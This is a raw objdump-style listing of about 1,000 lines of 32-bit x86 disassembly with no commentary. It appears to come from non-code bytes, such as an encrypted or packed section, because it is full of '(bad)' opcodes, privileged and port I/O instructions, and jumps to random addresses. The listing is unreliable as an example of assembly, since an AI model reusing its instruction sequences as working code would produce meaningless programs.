  41aa5a:	xor    ah,BYTE PTR [esi+0x66cd9265]
  41aa60:	xor    BYTE PTR [ebx*4-0x2de170b9],cl
  41aa67:	in     eax,dx
  41aa68:	je     0x41aa7b
  41aa6a:	add    al,0x28
  41aa6c:	sub    eax,0x91451195
  41aa71:	inc    esp
  41aa72:	xor    al,BYTE PTR [ebp-0x4897fb5e]
  41aa78:	fist   DWORD PTR [esi+ecx*8+0x2a]
  41aa7c:	add    al,0x2
  41aa7e:	inc    ecx
  41aa7f:	xor    al,0x4d
  41aa81:	jecxz  0x41aa75
  41aa83:	repnz adc cl,BYTE PTR [ebp-0x2d]
  41aa87:	mov    ch,al
  41aa89:	bound  ebp,QWORD PTR [edi+edx*4]
  41aa8c:	dec    ebx
  41aa8d:	enter  0x1f3e,0x51
  41aa91:	sti    
  41aa92:	jl     0x41ab0b
  41aa94:	jbe    0x41aa8c
  41aa96:	test   al,0xd7
  41aa98:	jmp    0x41aa26
  41aa9a:	(bad)  
  41aa9b:	adc    ebp,DWORD PTR [esi-0x22]
  41aa9e:	mov    esp,0x25972e41
  41aaa3:	push   ss
  41aaa4:	lea    esi,[edx+0x1a31c850]
  41aaaa:	(bad)  
  41aaab:	jns    0x41aaa9
  41aaad:	call   0x9b9897c3
  41aab2:	dec    eax
  41aab3:	xor    al,0xca
  41aab5:	(bad)  
  41aab6:	out    0x6,al
  41aab8:	mov    dl,BYTE PTR [edx]
  41aaba:	cwde   
  41aabb:	jge    0x41aa9b
  41aabd:	push   eax
  41aabe:	nop
  41aabf:	mov    ebp,0x9d3a03fd
  41aac4:	push   cs
  41aac5:	mov    ds:0xb2b2b324,al
  41aaca:	mov    WORD PTR [ecx+0x18],gs
  41aacd:	je     0x41ab09
  41aacf:	ins    DWORD PTR es:[edi],dx
  41aad0:	fs pop ecx
  41aad2:	data16 cmp dl,BYTE PTR [ebp-0x67]
  41aad6:	dec    esp
  41aad7:	daa    
  41aad8:	shr    BYTE PTR fs:[ecx-0x4e],cl
  41aadc:	stc    
  41aadd:	cmp    al,0x87
  41aadf:	pop    es
  41aae0:	pop    es
  41aae1:	cmp    al,0x7e
  41aae3:	hlt    
  41aae4:	cwde   
  41aae5:	mov    ds:0x6654b941,ax
  41aaeb:	mov    cl,0xb4
  41aaed:	inc    esp
  41aaee:	xor    bl,BYTE PTR [esi-0x2eb36ae0]
  41aaf4:	imul   esi,DWORD PTR [edi+0x12af3f39],0x2649070e
  41aafe:	push   ebx
  41aaff:	pushf  
  41ab00:	popf   
  41ab01:	sahf   
  41ab02:	mov    cl,0xbd
  41ab04:	std    
  41ab05:	mov    cl,dh
  41ab07:	push   0x5b8dd6c2
  41ab0c:	sub    BYTE PTR [ecx],al
  41ab0e:	aas    
  41ab0f:	xchg   BYTE PTR [ecx-0x6fb0e1cd],ah
  41ab15:	and    al,0x99
  41ab17:	dec    eax
  41ab18:	and    al,0xca
  41ab1a:	in     eax,dx
  41ab1b:	cmp    ecx,edi
  41ab1d:	xor    al,ch
  41ab1f:	idiv   DWORD PTR [ecx]
  41ab21:	cmp    eax,0x6161633b
  41ab26:	xor    DWORD PTR [eax+0x38],0x4f2793c4
  41ab2d:	cwde   
  41ab2e:	dec    esi
  41ab2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab31:	push   ebx
  41ab32:	imul   ebp,DWORD PTR [esi],0xaf392f2f
  41ab38:	push   esi
  41ab39:	mov    DWORD PTR [ebx+eiz*4+0xc],eax
  41ab3d:	jp     0x41ab9c
  41ab3f:	sbb    cl,ch
  41ab41:	es jmp 0x652b4193
  41ab47:	inc    edx
  41ab48:	sub    BYTE PTR [edx+eax*8],bl
  41ab4b:	out    dx,eax
  41ab4c:	repz lds edi,FWORD PTR [edi-0x6602c11]
  41ab53:	(bad)  
  41ab54:	mov    edi,0x75fe6fff
  41ab59:	call   FWORD PTR [ebp-0x42]
  41ab5c:	popf   
  41ab5d:	mov    esi,0xdae56b
  41ab62:	jl     0x41ab81
  41ab64:	stc    
  41ab65:	clc    
  41ab66:	idiv   DWORD PTR [ebp-0x6]
  41ab69:	out    0x65,al
  41ab6b:	lods   eax,DWORD PTR ds:[esi]
  41ab6c:	div    BYTE PTR [ebx+0x6e5850e1]
  41ab72:	mov    bh,0x5b
  41ab74:	xchg   esp,eax
  41ab75:	retf   
  41ab76:	sub    ebp,DWORD PTR [eax-0x3f9f7b16]
  41ab7c:	iret   
  41ab7d:	shl    BYTE PTR [edx+0x9],cl
  41ab80:	dec    ebp
  41ab81:	ror    DWORD PTR [eax],cl
  41ab83:	push   es
  41ab84:	add    esp,esp
  41ab86:	jae    0x41ab8d
  41ab88:	je     0x41abe7
  41ab8a:	xor    bl,BYTE PTR [bx+di-0x74f0]
  41ab8f:	inc    ebp
  41ab90:	dec    ecx
  41ab91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab92:	rcr    DWORD PTR [edi+ebx*1],cl
  41ab95:	sbb    eax,0x925daf51
  41ab9a:	dec    edx
  41ab9b:	and    eax,0x9ca74e99
  41aba0:	popf   
  41aba1:	push   ebp
  41aba2:	call   0xa306a5b6
  41aba7:	adc    edx,esp
  41aba9:	icebp  
  41abaa:	add    al,0xfd
  41abac:	jle    0x41ab8d
  41abae:	gs mov al,0x45
  41abb1:	and    dl,BYTE PTR [ecx]
  41abb3:	rcr    BYTE PTR [ecx-0x7d870ef4],cl
  41abb9:	mov    ebp,0x4f4e1dbd
  41abbe:	dec    esi
  41abbf:	add    al,dh
  41abc1:	stc    
  41abc2:	cld    
  41abc3:	mov    edi,es
  41abc5:	and    esp,DWORD PTR [esi]
  41abc7:	xchg   ebx,eax
  41abc8:	xor    DWORD PTR [ecx+0x71629c58],esi
  41abce:	xchg   ecx,eax
  41abcf:	pusha  
  41abd0:	xor    BYTE PTR [eax+0x22],cl
  41abd3:	xchg   ebp,eax
  41abd4:	es push ss
  41abd6:	mov    esi,ecx
  41abd8:	out    0x1b,al
  41abda:	outs   dx,DWORD PTR ds:[esi]
  41abdb:	jo     0x41ac57
  41abdd:	jbe    0x41aba9
  41abdf:	push   0x5e5ca434
  41abe4:	es xchg edi,eax
  41abe6:	retf   
  41abe7:	adc    cl,BYTE PTR [esi+eax*4]
  41abea:	sub    BYTE PTR [ebp+0x1d5bb44b],dl
  41abf0:	mov    dh,0xb7
  41abf2:	mov    bh,0x69
  41abf4:	xor    al,0xea
  41abf6:	dec    eax
  41abf7:	ds aas 
  41abf9:	add    DWORD PTR [ebp+0x61],eax
  41abfc:	xor    bl,BYTE PTR [ecx+0x8e7cf92]
  41ac02:	test   DWORD PTR [edx+0x34],eax
  41ac05:	pop    ebx
  41ac06:	ins    DWORD PTR es:[edi],dx
  41ac07:	push   cs
  41ac08:	push   cs
  41ac09:	push   cs
  41ac0a:	nop
  41ac0b:	and    al,0x19
  41ac0d:	pop    ebp
  41ac0e:	aaa    
  41ac0f:	push   eax
  41ac10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac11:	push   ebx
  41ac12:	jl     0x41ac52
  41ac14:	pop    ds
  41ac15:	stc    
  41ac16:	ret    0x9a02
  41ac19:	scas   al,BYTE PTR es:[edi]
  41ac1a:	mov    cl,0xb7
  41ac1c:	mov    bh,0x47
  41ac1e:	mov    ds:0x3bf59cd9,eax
  41ac23:	and    al,0x13
  41ac25:	sbb    BYTE PTR [esi+0x375bcdce],al
  41ac2b:	xor    DWORD PTR [ebp-0x7d],esi
  41ac2e:	xlat   BYTE PTR ds:[ebx]
  41ac2f:	fistp  QWORD PTR [eax-0x63]
  41ac32:	mov    ds:0xc30c23a3,eax
  41ac37:	fs jae 0x41acad
  41ac3a:	xchg   ebx,eax
  41ac3b:	cmp    al,BYTE PTR fs:[ebp+0x61]
  41ac3f:	popa   
  41ac40:	sbb    DWORD PTR [esi+ebp*1-0x3d],0xda6ded93
  41ac48:	in     eax,dx
  41ac49:	push   ss
  41ac4a:	xchg   edx,eax
  41ac4b:	sub    al,0x53
  41ac4d:	pop    edx
  41ac4e:	sub    dh,BYTE PTR [ebx]
  41ac50:	push   ds
  41ac51:	lea    edi,[eax]
  41ac53:	cmp    al,0x3c
  41ac55:	inc    eax
  41ac56:	push   ebp
  41ac57:	push   ebp
  41ac58:	mov    ds:0x489138f1,al
  41ac5d:	test   BYTE PTR [ebp-0x36adca2b],dl
  41ac63:	adc    al,0xbb
  41ac65:	cmp    edi,DWORD PTR [ebx]
  41ac67:	or     al,0x6
  41ac69:	add    eax,DWORD PTR [edx+0x58b12081]
  41ac6f:	xchg   esp,eax
  41ac70:	ret    
  41ac71:	ret    
  41ac72:	add    esi,esi
  41ac74:	div    edi
  41ac76:	mov    bh,al
  41ac78:	arpl   WORD PTR [esp+ebp*4+0x28822ac],bp
  41ac7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac80:	popa   
  41ac81:	xor    BYTE PTR [esi],bl
  41ac83:	vprotq ymm13,[edx*4+0x6142844a],xmm3
  41ac8d:	into   
  41ac8e:	dec    esi
  41ac8f:	dec    esi
  41ac90:	dec    ecx
  41ac91:	and    al,0x13
  41ac93:	lods   al,BYTE PTR ds:[esi]
  41ac94:	outs   dx,DWORD PTR ds:[esi]
  41ac95:	ins    BYTE PTR es:[edi],dx
  41ac96:	jo     0x41ad14
  41ac98:	je     0x41ac1e
  41ac9a:	gs cdq 
  41ac9c:	fdivr  QWORD PTR [eax-0x40816c87]
  41aca2:	(bad)  
  41aca3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aca4:	stos   BYTE PTR es:[edi],al
  41aca5:	lods   al,BYTE PTR ds:[esi]
  41aca6:	outs   dx,BYTE PTR ds:[esi]
  41aca7:	ins    BYTE PTR es:[edi],dx
  41aca8:	pusha  
  41aca9:	sbb    BYTE PTR [edx],bh
  41acab:	xchg   edx,eax
  41acac:	and    al,0x33
  41acae:	sahf   
  41acaf:	mov    WORD PTR [ebx-0x53],es
  41acb2:	push   esi
  41acb3:	jmp    0x41ac40
  41acb5:	jg     0x41acb1
  41acb7:	lds    edi,FWORD PTR [edi]
  41acb9:	jns    0x41acaf
  41acbb:	fisttp WORD PTR cs:[esi-0x21]
  41acbf:	mov    ch,0x72
  41acc1:	popf   
  41acc2:	add    bh,BYTE PTR [ebp+ebx*1-0xf]
  41acc6:	leave  
  41acc7:	mov    esi,0x18a2494f
  41accc:	cwde   
  41accd:	stos   BYTE PTR es:[edi],al
  41acce:	push   ebx
  41accf:	push   es
  41acd0:	std    
  41acd1:	add    DWORD PTR [ebp+0x5145177e],edi
  41acd7:	cmp    BYTE PTR [ebx],bh
  41acd9:	cmp    eax,0x645850a5
  41acde:	cmp    al,0x1e
  41ace0:	mov    cl,0xb7
  41ace2:	mov    bl,0xc7
  41ace4:	(bad)  
  41ace5:	out    0x26,al
  41ace7:	loope  0x41ad31
  41ace9:	test   bh,dl
  41aceb:	fistp  QWORD PTR [eax-0x63]
  41acee:	pop    eax
  41acef:	xor    al,0xc2
  41acf1:	(bad)  
  41acf2:	lea    ebx,[ebx+0x4c]
  41acf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acf6:	adc    ebx,edx
  41acf8:	popf   
  41acf9:	push   cs
  41acfa:	mov    ebx,0xca94bbbb
  41acff:	gs adc dh,cl
  41ad02:	cmp    BYTE PTR [ebp+0x1fc5074e],bl
  41ad08:	and    BYTE PTR [ebp+0x124b22cd],dl
  41ad0e:	rcr    DWORD PTR [eax-0x74],1
  41ad11:	inc    esi
  41ad12:	mov    ebp,0x22d3a741
  41ad17:	sbb    al,0x8d
  41ad19:	push   edx
  41ad1a:	cs sub eax,0x194e9d33
  41ad20:	pop    DWORD PTR [edi+0x54]
  41ad23:	stos   DWORD PTR es:[edi],eax
  41ad24:	adc    eax,0xdccb9796
  41ad29:	mov    esi,0x46cd0cfd
  41ad2e:	xor    DWORD PTR [esi+eiz*1+0x4d],0xfffffff5
  41ad33:	mov    esp,0x4976ad4a
  41ad38:	and    BYTE PTR [esi+eiz*4],dl
  41ad3b:	nop
  41ad3c:	das    
  41ad3d:	adc    BYTE PTR [esi+eax*4],cl
  41ad40:	adc    BYTE PTR [ecx+eax*1],al
  41ad43:	pop    ebp
  41ad44:	aaa    
  41ad45:	lock sti 
  41ad47:	jge    0x41ad4d
  41ad49:	add    cl,BYTE PTR [edx]
  41ad4b:	dec    edx
  41ad4c:	and    BYTE PTR [eax+0x3e],cl
  41ad4f:	fwait
  41ad50:	out    0xf1,al
  41ad52:	div    BYTE PTR [esi]
  41ad54:	aad    0xf3
  41ad56:	jae    0x41ad5c
  41ad58:	mov    al,ds:0xb5b22850
  41ad5d:	mov    cl,0x41
  41ad5f:	and    al,0x12
  41ad61:	and    eax,0xeaa38f19
  41ad66:	sub    bl,BYTE PTR [edi-0x2]
  41ad69:	retf   0x74eb
  41ad6c:	cmp    ch,BYTE PTR [ebp+0x54]
  41ad6f:	push   ebp
  41ad70:	jecxz  0x41ad35
  41ad72:	pop    ds
  41ad73:	jp     0x41ad0a
  41ad75:	push   0x6aae862c
  41ad7a:	xor    ch,BYTE PTR fs:[ecx]
  41ad7d:	fidivr WORD PTR [ebx+esi*8+0x1e]
  41ad81:	xchg   DWORD PTR [edi+0x47],eax
  41ad84:	pop    eax
  41ad85:	pop    eax
  41ad86:	adc    al,0xa
  41ad88:	jns    0x41ade0
  41ad8a:	xchg   edi,eax
  41ad8b:	retf   
  41ad8c:	add    al,0x3
  41ad8e:	inc    ecx
  41ad8f:	xor    ch,cl
  41ad91:	and    al,0xed
  41ad93:	jbe    0x41ad30
  41ad95:	outs   dx,BYTE PTR ds:[esi]
  41ad96:	mov    bh,0x8b
  41ad98:	imul   ebx,DWORD PTR [edx+0x69869a68],0x5dbaf499
  41ada2:	dec    esp
  41ada3:	ret    
  41ada4:	xor    bl,BYTE PTR fs:[esi+0x30e6cb90]
  41adab:	dec    ebp
  41adac:	mov    edx,DWORD PTR [edx-0x47]
  41adaf:	int3   
  41adb0:	js     0x41ade4
  41adb2:	loop   0x41ad92
  41adb4:	fwait
  41adb5:	imul   DWORD PTR [eax+0x36]
  41adb8:	jmp    0x7eaf:0xabce9aa8
  41adbf:	enter  0x2aee,0xb4
  41adc3:	xor    BYTE PTR [ebx+edx*4],cl
  41adc6:	je     0x41adee
  41adc8:	and    DWORD PTR [eax],0x8
  41adcb:	fdivr  QWORD PTR [edx-0x44896483]
  41add1:	inc    ebp
  41add2:	in     eax,0xf4
  41add4:	adc    al,0xcd
  41add6:	shl    BYTE PTR [ecx],1
  41add8:	dec    ebp
  41add9:	mov    edx,DWORD PTR [esi-0x55]
  41addc:	(bad)
  41addf:	inc    edi
  41ade0:	add    al,0x94
  41ade2:	and    BYTE PTR [edi+0x3a61dcee],dh
  41ade8:	sbb    ebx,edx
  41adea:	out    dx,eax
  41adeb:	wrmsr  
  41aded:	sub    eax,0xbd9e678b
  41adf2:	mov    esp,DWORD PTR [ecx-0x18]
  41adf5:	pop    eax
  41adf6:	pop    eax
  41adf7:	fs mov bl,0x59
  41adfa:	jb     0x41adb5
  41adfc:	cmp    al,0x1
  41adfe:	inc    ebp
  41adff:	shl    edi,0xf3
  41ae02:	mov    cl,0xb2
  41ae04:	mov    edx,0x249a6586
  41ae09:	loop   0x41ae54
  41ae0b:	cs das 
  41ae0d:	into   
  41ae0e:	sbb    esp,esi
  41ae10:	sti    
  41ae11:	test   BYTE PTR [edx-0x5f],al
  41ae14:	pop    ds
  41ae15:	add    BYTE PTR [esi-0xd],bh
  41ae18:	fnstsw WORD PTR [esi-0x1aa44161]
  41ae1e:	cmp    al,BYTE PTR [edx]
  41ae20:	clc    
  41ae21:	cmp    dh,dl
  41ae23:	loop   0x41adf0
  41ae25:	pop    ds
  41ae26:	clc    
  41ae27:	pop    ecx
  41ae28:	push   ecx
  41ae29:	xchg   esp,eax
  41ae2a:	mov    dh,0x72
  41ae2c:	stc    
  41ae2d:	cmp    al,0xe3
  41ae2f:	loope  0x41adc1
  41ae31:	test   eax,0x2a0a11aa
  41ae36:	je     0x41adf3
  41ae38:	sbb    eax,0x96465924
  41ae3d:	and    eax,0x2536d4bb
  41ae42:	sbb    BYTE PTR [eax],cl
  41ae44:	shr    ch,1
  41ae46:	mov    ah,0xe9
  41ae48:	jne    0x41aec5
  41ae4a:	add    al,0x3
  41ae4c:	add    edx,edx
  41ae4e:	cdq    
  41ae4f:	or     al,0xad
  41ae51:	push   esi
  41ae52:	or     eax,DWORD PTR [ecx+0x14]
  41ae55:	(bad)  
  41ae57:	fsub   QWORD PTR [edx+edx*1]
  41ae5a:	mov    edx,DWORD PTR [ecx]
  41ae5c:	pop    edi
  41ae5e:	push   ecx
  41ae5f:	adc    al,0x3f
  41ae61:	mov    ds:0x3da7ace1,eax
  41ae66:	xchg   ebx,eax
  41ae67:	iret   
  41ae68:	xor    ebx,DWORD PTR [edx]
  41ae6a:	or     al,0xd8
  41ae6c:	fnstcw WORD PTR [esi+0x4c]
  41ae6f:	mov    edi,0x25143d7
  41ae74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae75:	shr    DWORD PTR [ecx-0x3a],cl
  41ae78:	xchg   ebx,eax
  41ae79:	xor    DWORD PTR [ecx+0x34489450],edx
  41ae7f:	mov    ah,BYTE PTR [ecx+ecx*4]
  41ae82:	dec    eax
  41ae83:	xchg   edx,eax
  41ae84:	dec    eax
  41ae85:	mov    esi,0xaf56a050
  41ae8a:	mov    cl,0xbf
  41ae8c:	mov    ebx,0x92f2ed43
  41ae91:	je     0x41aecd
  41ae93:	cmp    eax,0x99241f4b
  41ae98:	cmc    
  41ae99:	lea    esi,[ebp+0x26]
  41ae9c:	xchg   ebx,eax
  41ae9d:	or     DWORD PTR [edi-0x61637879],eax
  41aea3:	pushf  
  41aea4:	and    ah,BYTE PTR [eax]
  41aea6:	and    BYTE PTR [edx-0x670e6cee],cl
  41aeac:	pusha  
  41aead:	and    BYTE PTR [eax+0x3a],cl
  41aeb0:	xchg   ebx,eax
  41aeb1:	add    ecx,eax
  41aeb3:	mov    ds:0xb4473d5a,al
  41aeb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aeb9:	(bad)  
  41aeba:	xor    al,0x1b
  41aebc:	dec    ebp
  41aebd:	push   esp
  41aebe:	push   ebp
  41aebf:	and    eax,0x4a924a99
  41aec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aec5:	call   0xb62f16bf
  41aeca:	and    DWORD PTR [eax-0x70],0xbb47b76e
  41aed1:	frstor [esi]
  41aed3:	push   ss
  41aed4:	mov    edx,DWORD PTR [edx-0x72e658b2]
  41aeda:	inc    esi
  41aedb:	cmp    al,0xd9
  41aedd:	fldenv [ecx+0x3a]
  41aee0:	cdq    
  41aee1:	and    bl,bh
  41aee3:	cld    
  41aee4:	test   BYTE PTR [edx+0x1],al
  41aee7:	ret    0x30e1
  41aeea:	aaa    
  41aeeb:	outs   dx,BYTE PTR ds:[esi]
  41aeec:	fsubrp st(0),st
  41aeee:	mov    esp,0x7b83c17a
  41aef3:	imul   DWORD PTR [eax-0x4c5b54aa]
  41aef9:	sbb    DWORD PTR [esi],esi
  41aefb:	xlat   BYTE PTR ss:[ebx]
  41aefd:	or     DWORD PTR [edi+0x79f3e4c2],eax
  41af03:	sub    al,0xcb
  41af05:	outs   dx,DWORD PTR fs:[esi]
  41af07:	outs   dx,DWORD PTR ds:[esi]
  41af08:	pop    es
  41af09:	dec    ebx
  41af0a:	aaa    
  41af0b:	leave  
  41af0c:	in     eax,0x72
  41af0e:	cwde   
  41af0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af10:	shl    esi,0xa3
  41af13:	inc    edi
  41af14:	sbb    al,0x1f
  41af16:	push   ds
  41af17:	adc    BYTE PTR [ebp+0x4a952946],cl
  41af1d:	test   BYTE PTR [ebx+0x3499d251],ah
  41af23:	jecxz  0x41aef6
  41af25:	mov    BYTE PTR [edx-0x53],bl
  41af28:	dec    esi
  41af29:	mov    eax,ds:0x5b9f2790
  41af2e:	loopne 0x41af21
  41af30:	jecxz  0x41aeb9
  41af32:	aam    0x6a
  41af34:	xor    eax,0x549f8afc
  41af39:	xor    cl,cl
  41af3b:	loope  0x41af3b
  41af3d:	add    DWORD PTR [edi],eax
  41af3f:	pop    es
  41af40:	sti    
  41af41:	in     al,0xf3
  41af43:	add    eax,0xd508d122
  41af48:	dec    edx
  41af49:	test   ecx,ecx
  41af4b:	fs ret 0xa952
  41af4f:	test   BYTE PTR [edx],bh
  41af51:	push   ebp
  41af52:	jmp    0x5366aa4c
  41af57:	dec    ecx
  41af58:	xor    al,0x4d
  41af5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af5b:	shr    esi,cl
  41af5d:	adc    BYTE PTR [esi],cl
  41af5f:	inc    edi
  41af60:	cmp    BYTE PTR [ecx],bh
  41af62:	cmp    eax,0x4c449241
  41af67:	ror    DWORD PTR [esi+edi*8-0x702a00e9],cl
  41af6e:	(bad)  
  41af6f:	cli    
  41af70:	outs   dx,DWORD PTR ds:[esi]
  41af71:	call   esi
  41af73:	outs   dx,DWORD PTR ds:[esi]
  41af74:	test   eax,0xf53df6ef
  41af79:	(bad)  [eax]
  41af7b:	xlat   BYTE PTR ds:[ebx]
  41af7c:	adc    eax,eax
  41af7e:	xlat   BYTE PTR ds:[ebx]
  41af7f:	nop
  41af80:	mov    edi,0xcdffdff6
  41af85:	bound  ebp,QWORD PTR [ebx-0x6cc68123]
  41af8b:	leave  
  41af8c:	adc    BYTE PTR [ebp+0x33654945],cl
  41af92:	hlt    
  41af93:	sti    
  41af94:	cmp    eax,0xd30cd9b2
  41af99:	jmp    0xc5fd2636
  41af9e:	ret    0x2c2
  41afa1:	xchg   ecx,eax
  41afa2:	push   0x8faf7e84
  41afa7:	mov    ds:0x5e5e5804,al
  41afac:	gs jg  0x41b02e
  41afaf:	pop    ss
  41afb0:	lahf   
  41afb1:	iret   
  41afb2:	dec    edi
  41afb3:	cs lahf 
  41afb5:	(bad)  
  41afb6:	ror    BYTE PTR ds:0xd3a25964,1
  41afbc:	in     eax,dx
  41afbd:	and    al,BYTE PTR [eax]
  41afbf:	jmp    0x20a23610
  41afc4:	shr    bl,0xaf
  41afc7:	jg     0x41af4e
  41afc9:	icebp  
  41afca:	js     0x41af50
  41afcc:	stos   BYTE PTR es:[edi],al
  41afcd:	test   eax,0x42614284
  41afd2:	mov    eax,ds:0x4e99310
  41afd7:	pop    ecx
  41afd8:	xchg   esi,eax
  41afd9:	pop    eax
  41afda:	sub    BYTE PTR [esi],ch
  41afdc:	and    BYTE PTR [edx+0x12],cl
  41afdf:	test   eax,0xb74e8264
  41afe4:	retf   
  41afe5:	into   
  41afe6:	xchg   ebx,eax
  41afe7:	sbb    eax,0x34c7430c
  41afec:	dec    ebp
  41afed:	add    cl,BYTE PTR [edx-0x70]
  41aff0:	inc    eax
  41aff1:	xor    al,cl
  41aff3:	push   0xc4410134
  41aff8:	out    0xf7,eax
  41affa:	xchg   ecx,eax
  41affb:	leave  
  41affc:	enterw 0x72e5,0xb4
  41b001:	pop    edx
  41b002:	xor    eax,DWORD PTR [edx-0xeaaab34]
  41b008:	sti    
  41b009:	jl     0x41b087
  41b00b:	call   0x89545fd3
  41b010:	inc    esp
  41b011:	adc    BYTE PTR [ebp-0x7f],al
  41b014:	dec    eax
  41b015:	and    al,0xc2
  41b017:	jmp    0x41afc8
  41b019:	mov    edi,0x19c9e9ce
  41b01e:	xchg   ebp,eax
  41b01f:	retf   0xef19
  41b022:	jg     0x41b00d
  41b024:	std    
  41b025:	mov    esp,0xb817bef8
  41b02a:	lods   al,BYTE PTR ds:[esi]
  41b02b:	aad    0x28
  41b02d:	push   ss
  41b02e:	mov    esi,DWORD PTR [ebx+ebx*8-0x1c872193]
  41b035:	push   ds
  41b036:	jecxz  0x41b029
  41b038:	nop
  41b039:	leave  
  41b03a:	fs retf 0xe6d6
  41b03e:	push   es
  41b03f:	mov    cl,0x58
  41b041:	mov    WORD PTR [eax+0x34],?
  41b044:	inc    esp
  41b045:	sub    BYTE PTR [eax],dl
  41b047:	out    0x8b,al
  41b049:	pop    edi
  41b04a:	cli    
  41b04b:	and    dl,BYTE PTR [ebp-0x12c5cc4d]
  41b051:	ss lahf 
  41b053:	cld    
  41b054:	mov    esi,0x2749924f
  41b059:	jmp    0x33a6abd2
  41b05e:	sbb    DWORD PTR [edx+0x17],ebp
  41b061:	xor    eax,0x8209e326
  41b066:	sub    al,0xa1
  41b068:	test   eax,0x97769d2a
  41b06d:	ret    
  41b06e:	ret    
  41b06f:	add    eax,edx
  41b071:	mov    ch,0x30
  41b073:	leave  
  41b074:	push   esp
  41b075:	call   0xb74e:0x91785e17
  41b07c:	ret    
  41b07d:	lea    ebx,[ebx]
  41b07f:	aaa    
  41b080:	fnstcw WORD PTR [esi-0x4]
  41b083:	cwde   
  41b084:	retf   
  41b085:	retf   
  41b086:	jae    0x41b0b4
  41b088:	shl    DWORD PTR [eax+0x65],cl
  41b08b:	loopne 0x41b0ca
  41b08d:	add    BYTE PTR [eax],al
  41b08f:	and    BYTE PTR [eax],al
  41b091:	dec    ecx
  41b092:	inc    esp
  41b093:	inc    ecx
  41b094:	push   esp
  41b095:	fs xor al,0x1a
  41b098:	adc    DWORD PTR [ecx+0x3c3e394e],ebx
  41b09e:	mov    al,ds:0x8d106cd5
  41b0a3:	lds    edi,FWORD PTR [eax-0x12]
  41b0a6:	test   edi,esp
  41b0a8:	push   ecx
  41b0a9:	jl     0x41b0e9
  41b0ab:	(bad)
  41b0b0:	adc    DWORD PTR [esi],ecx
  41b0b2:	xchg   DWORD PTR [ecx],ebp
  41b0b4:	xchg   ebp,eax
  41b0b5:	xchg   esi,eax
  41b0b6:	imul   esi,DWORD PTR [ebp+0x672a545a],0xa74c0a20
  41b0c0:	adc    ebp,DWORD PTR [edx-0x4b]
  41b0c3:	dec    ebx
  41b0c4:	div    bh
  41b0c6:	neg    DWORD PTR [ecx+0x5f]
  41b0c9:	fild   WORD PTR [eax+0x55]
  41b0cc:	push   ebp
  41b0cd:	div    bh
  41b0cf:	jbe    0x41b0da
  41b0d1:	fld    TBYTE PTR [ecx-0x2c]
  41b0d4:	std    
  41b0d5:	jnp    0x41b146
  41b0d7:	and    cl,BYTE PTR [eax]
  41b0d9:	add    ah,BYTE PTR [edx-0x817cfd8]
  41b0df:	sub    BYTE PTR [ebp+0x60c1997],dl
  41b0e5:	imul   esp,DWORD PTR [edi-0x59],0xffffffd5
  41b0e9:	out    0x81,eax
  41b0eb:	aas    
  41b0ec:	jp     0x41b0a5
  41b0ee:	out    dx,eax
  41b0ef:	stos   DWORD PTR es:[edi],eax
  41b0f0:	out    dx,eax
  41b0f1:	inc    esi
  41b0f2:	mov    ecx,0x5b5f0036
  41b0f7:	fidivr WORD PTR [edi]
  41b0f9:	sbb    al,0xc
  41b0fb:	mov    dl,0xe5
  41b0fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0fe:	adc    dl,BYTE PTR [esi-0x5ab56d97]
  41b104:	or     BYTE PTR [edx],ch
  41b106:	or     al,cl
  41b108:	inc    eax
  41b109:	nop
  41b10a:	lds    esp,FWORD PTR [ebp-0xc6482ce]
  41b110:	mov    edi,0xb345b9b1
  41b115:	push   ecx
  41b116:	mov    esp,0x10cd9d22
  41b11c:	or     BYTE PTR [eax+edx*4],al
  41b11f:	inc    esp
  41b120:	mov    DWORD PTR [esi-0x4d],esi
  41b123:	test   DWORD PTR [edx+0xa1429f8],esp
  41b129:	aam    0x6a
  41b12b:	xor    eax,0x26de3c9e
  41b130:	xchg   ebp,eax
  41b131:	dec    esi
  41b132:	push   ebx
  41b133:	pop    esi
  41b134:	pop    esi
  41b135:	inc    esi
  41b136:	inc    eax
  41b137:	cwde   
  41b138:	mov    cl,0xd8
  41b13a:	jmp    0x404e:0xb03ed675
  41b141:	push   ecx
  41b142:	push   0x9248dbb7
  41b147:	dec    eax
  41b148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b149:	push   edx
  41b14a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b14b:	xlat   BYTE PTR ds:[ebx]
  41b14c:	in     eax,dx
  41b14d:	adc    cl,BYTE PTR [edi+0xafc50c7]
  41b153:	mov    ebp,0x3aa98f5e
  41b158:	mov    eax,ds:0xdcf068d1
  41b15d:	jae    0x41b12e
  41b15f:	mov    eax,ds:0xe4922aeb
  41b164:	inc    ebx
  41b165:	or     DWORD PTR [esi],eax
  41b167:	jns    0x41b1d9
  41b169:	jmp    DWORD PTR [ecx]
  41b16b:	pop    ss
  41b16c:	pop    ss
  41b16d:	push   ebp
  41b16e:	(bad)  
  41b170:	mov    DWORD PTR ss:[edx+eax*4+0x7c],eax
  41b175:	mov    eax,ds:0x20d1b340
  41b17a:	adc    cl,BYTE PTR [ebx+0x18f5efd2]
  41b180:	push   cs
  41b181:	cli    
  41b182:	clc    
  41b183:	ins    BYTE PTR es:[edi],dx
  41b184:	and    al,dl
  41b186:	xor    al,0x4d
  41b188:	dec    esp
  41b189:	retf   
  41b18a:	inc    eax
  41b18b:	push   ebx
  41b18c:	xor    eax,0x2044927c
  41b191:	cmp    bl,dh
  41b193:	loop   0x41b156
  41b195:	pusha  
  41b196:	nop
  41b197:	jbe    0x41b154
  41b199:	lea    ebp,[edx+0x7d35d14e]
  41b19f:	xchg   esi,eax
  41b1a0:	cmp    ecx,ebx
  41b1a2:	adc    al,BYTE PTR [edx+0x26196020]
